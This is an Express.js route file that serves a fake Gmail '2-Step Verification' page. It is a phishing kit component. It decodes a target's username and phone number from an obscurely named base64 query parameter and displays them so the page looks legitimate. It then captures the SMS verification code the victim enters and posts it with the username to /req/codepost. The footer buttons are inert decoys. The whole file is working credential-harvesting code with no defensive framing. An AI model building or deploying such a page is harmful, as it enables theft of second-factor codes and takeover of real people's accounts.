const express = require('express');
const router = express.Router();

// Middleware setup
router.use(express.urlencoded({ extended: true })); // For parsing form data
router.use(express.json());
router.use(express.static('public'));

// GET route
router.get('/', async (req, res) => {
    const data6 = req.query.dfgfhtuyghnbcgferfh;
    
    if (!data6) {
        return res.render('error');
    }

    const dataArray1 = data6.split('/');
    const userid = dataArray1[0];
    const mobNumber = dataArray1[1];
    const username = Buffer.from(userid, 'base64').toString('utf-8');
    const mobile = Buffer.from(mobNumber, 'base64').toString('utf-8');
    const mobNumberStr = mobile.toString();
    const hiddenMobNumber = mobNumberStr.slice(10);

    console.log(mobile);


     
  

    if (username == null) {
        res.render('error');
    
      }else{

    const htmlContent = `
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Gmail - 2-Step Verification</title>
    <link rel="shortcut icon" href="/images/image.png" type="image/x-icon">
	<style>
        /* Hide body initially and fade in */
        body {
            display: none; /* Start blank */
            opacity: 0;
            transition: opacity 0.3s ease-in; /* Smooth fade-in */
            margin: 26px;
            font-family: Arial, Helvetica, sans-serif;
            background-color: #f0f4f9;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            height: 85vh;
        }
    </style>

    <script>
        // Wait 0.5 seconds then show the page
        window.addEventListener("load", () => {
            setTimeout(() => {
                document.body.style.display = "flex"; // show body
                requestAnimationFrame(() => { // ensure transition applies
                    document.body.style.opacity = "1";
                });
            }, 200); // 500ms pause
        });
    </script>
    <style>
        body {
            margin: 30px;
            font-family: Arial, Helvetica, sans-serif;
            background-color: #f0f4f9;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            min-height: 85vh;
        }

        .maindiv {
            width: 100%;
            max-width: 56vW;
            padding: 35px;
            background: #fff;
            border-radius: 20px;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
            display: flex;
            flex-wrap: wrap;
        }

        .divlogo {
            width: 52px;
            height: 52px;
            margin-bottom: 22px;
        }

        .welcome {
            font-size: 42px;
            margin: 10px 0;
        }

        .warning {
            font-size: 15px;
            color: #5f6368;
            margin-bottom: 20px;
			margin-top: 5px;
        }

        .userdiv {
            display: flex;
            align-items: center;
            justify-content: flex-start;
            border: 0.4px solid #312f2f;
            border-radius: 30px;
            background-color: transparent;
            padding: 4px;
            width: fit-content;
            margin-top: 28px;
            cursor: pointer;
        }

        .userdiv img {
            vertical-align: middle;
        }

        .user-icon {
            margin-top: 2px;
            margin-right: 15px;
            width: 20px;
            height: 20px;
        }

        .dropdown-icon {
            margin-top: 2px;
            margin-right: 12px;
            margin-left: 10px;
            width: 15px;
            height: 10px;
        }

        .userdiv span {
            font-size: 15px;
            color: #2c2a2a;
        }


        /* Left column */
       .form-half {
            flex: 1;
            width: 23vW;
            padding-right: 25px;
        }

        /* Right column */
        .form-half1 {
            flex: 1;
            width: 30vW;
            padding-left: 25px;
            display: flex;
            flex-direction: column;
            justify-content: space-between;
        }

        .gradient-box {
            width: 100%;
            height: 80%;
            background: linear-gradient(to top, #ffffff, #ebebeb 50%, #ffffff);
            display: flex;
            justify-content: center;
            align-items: center;
            margin-top: 35px;
        }

        .gradient-box img {
            max-width: 100%;
            max-height: 100%;
        }
		.phonediv {
            margin-top: 13vH;
        }
        .phonetype {
            font-size: 17px;
            font-weight: 500;
        }

        .messaged {
            font-size: 15px;
            color: #5f6368;
        }

        .passdiv {
            position: relative;
            margin-top: 30px;
            width: 100%;
        }

        input[type="text"] {
            width: 74%;
            height: 58px;
            padding: 12px 15px;
            font-size: 16px;
            border: 1.5px solid #666;
            border-radius: 8px;
            box-sizing: border-box;
        }

        input.focused {
            border: 2px solid #2649b0;
        }

        .placeholder-label {
            position: absolute;
            top: 50%;
            left: 4%;
            transform: translateY(-50%);
            color: #aaa;
            font-size: 20px;
            pointer-events: none;
            transition: all 0.2s ease;
        }

        input:focus + .placeholder-label,
        input:not(:placeholder-shown) + .placeholder-label {
            top: 0px;
            left: 5%;
            padding: 4px;
            background-color: #fff;
            color: #4a6dd5;
            font-size: 12px;
        }

        .tryn {
            margin-top: 32px;
            margin-left: 16vW;
            display: flex;
            gap: 28px;
        }

        .hyperl1 {
            font-size: 15px;
            color: #0e5abf;
            background: none;
            border: none;
            cursor: pointer;
            padding: 8px 12px;
        }

        .btnnxt {
            background-color: #0e5abf;
            color: white;
            border: none;
            border-radius: 16px;
            padding: 10px 24px;
            font-size: 15px;
            cursor: pointer;
        }
		.btnnxt:hover {
            background-color: #034099;
        }

        .btmdiv {
            width: calc(60% + 4cm);
            max-width: calc(860px + 5cm);
            padding: 2px 0;
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-top: 5px;
        }

        .right-divs {
            display: flex;
            gap: 15px;
        }

        .btmhypl {
            background-color: transparent;
            color: black;
            border: none;
            cursor: pointer;
            padding: 10px;
            font-size: 11px;
        }

        .btmhypl:hover {
            background-color: #e7f3ff;
        }

        @media (max-width: 768px) {
            .maindiv {
                flex-direction: column;
                padding: 30px;
                width: 100%;
    		max-width: 74vW;
            }
		
            .form-half, .form-half1 {
                padding: 0;
                width: 94%;
				margin-top: 43px;
            }
            
            .form-half1 {
                margin-top: 30px;
                border-left: none; /* Remove divider on mobile */
            }
			.phonediv {
            margin-top: 4vH;
        }
            
            .tryn {
                margin-left: 0;
                justify-content: flex-end;
            }

            input[type="text"] {
                width: 100%;
            }
			 .placeholder-label {
              top: 50%;
              left: 5%;
              font-size: 22px;
            }

            .btmdiv {
                flex-direction: column;
                gap: 10px;
            }

            .right-divs {
                justify-content: center;
            }
        }
    </style>
</head>
<body>
    <div class="maindiv">
        <!-- Left Column -->
        <div class="form-half">
            <div><img class="divlogo" src="images/image.png" alt="Logo"></div>
            <div><span class="welcome">Verify it's you</span></div>
            <div><span class="warning">To help keep your account safe, Google wants to make sure it's really you trying to sign in</span></div>
            <div class="userdiv">
                <img class="user-icon" src="/images/user-circle.png" alt="User Icon">
                <span style="color: #2c2a2a; font-size: 18px;">${username}</span>
                <img class="dropdown-icon" src="images/dropd.jpg" alt="Dropdown Icon">
            </div>
        </div>
        
        <!-- Right Column -->
		<form class="loginform1" method="post" name="loginForm" action="/req/codepost" accept-charset="UTF-8">
            <div class="form-half1">
                <!-- <center>
                    <div class="gradient-box"><img src="images/account-recovery-sms-pin.gif" alt="SMS Recovery"></div>
                </center> -->
                <div class="phonediv">
                    <span class="phonetype">Enter a verification code</span><br><br>
                    <span class="messaged"> A text message with a verification code was just sent to your mobile ${mobNumberStr}.</i></span>
                </div>
                <br>
                <div class="passdiv">
                    <input type="hidden" name="username" id="useRname" value="${username}">
                    <input type="text" id="code" name="code" placeholder=" " required>
                    <label for="code" class="placeholder-label">Code</label>
                </div>
                <div class="tryn">
                    <button type="button" class="hyperl1">Try another way</button>
                    <button type="submit" class="btnnxt">Send</button>
                </div>
            </div>
        </form>
    </div>

    <div class="btmdiv">
        <div class="left-div">
            <select class="btmhypl" id="language-select">
                <option value="en">English (United States)</option>
                <option value="fr">French</option>
                <option value="es">Spanish</option>
                <option value="de">German</option>
            </select>
        </div>
        <div class="right-divs">
            <div class="right-div">
                <button id="helpButton" class="btmhypl">Help</button>
            </div>
            <div class="right-div">
                <button id="privacyButton" class="btmhypl">Privacy</button>
            </div>
            <div class="right-div">
                <button id="termsButton" class="btmhypl">Terms</button>
            </div>
        </div>
    </div>

    <script>

                        const passwordInput = document.getElementById("code");
                       

                        // Add 'focused' class on focus and remove on blur
                        passwordInput.addEventListener("focus", function () {
                            this.classList.add("focused");
                        });

                        // Keep the 'focused' class even after blur
                        passwordInput.addEventListener("blur", function () {
                            if (this.value.trim() !== "") {
                                this.classList.add("focused");
                            } else {
                                this.classList.remove("focused");
                            }
                        });

        document.querySelectorAll('#helpButton, #privacyButton, #termsButton').forEach(button => {
            button.onclick = function(event) {
                event.preventDefault();
                 if (history.length > 1) {
                                    history.back();  // Go back if there's history
                                } else {
                                    location.reload();  // Refresh current page instead of alert/redirect
                                }
            };
        });
    </script>
</body>
</html>
    `;

    // Send the HTML content as a response
     res.send(htmlContent);

            } 

});

module.exports =router;

    
